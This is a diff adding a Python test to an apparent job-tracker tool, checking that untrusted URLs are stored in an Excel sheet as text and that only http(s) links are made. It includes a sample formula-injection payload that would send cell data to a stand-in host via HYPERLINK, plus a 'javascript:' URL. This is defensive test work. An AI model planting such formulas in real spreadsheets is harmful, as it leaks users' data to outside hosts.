@@ -399,3 +399,18 @@ def test_untrusted_strings_are_stored_as_text_never_formulas(tmp_path: Path, evi
     assert len(cells) >= 7
     assert all(c.data_type == "s" for c in cells), [(c.coordinate, c.data_type) for c in cells]
     assert tr.get_job("f1")["Company"] == evil
+
+
+def test_board_url_is_text_and_only_http_links(tmp_path: Path):
+    p = tmp_path / "JobTracker.xlsx"
+    tr = Tracker(path=p)
+    evil = '=HYPERLINK("http://x.example/?"&A1,"click")'
+    tr.upsert_job({"job_id": "u1", "url": evil})
+    tr.upsert_job({"job_id": "u2", "url": "javascript:alert(1)"})
+    tr.upsert_job({"job_id": "u3", "url": "https://boards.greenhouse.io/acme/jobs/1"})
+    ws = load_workbook(p)["Jobs"]
+    hdr = {c.value: c.column for c in ws[1]}
+    cells = {ws.cell(row=r, column=hdr["JobID"]).value: ws.cell(row=r, column=hdr["URL"]) for r in range(2, ws.max_row + 1)}
+    assert cells["u1"].data_type == "s" and cells["u1"].value == evil and cells["u1"].hyperlink is None
+    assert cells["u2"].hyperlink is None
+    assert cells["u3"].hyperlink.target == "https://boards.greenhouse.io/acme/jobs/1"
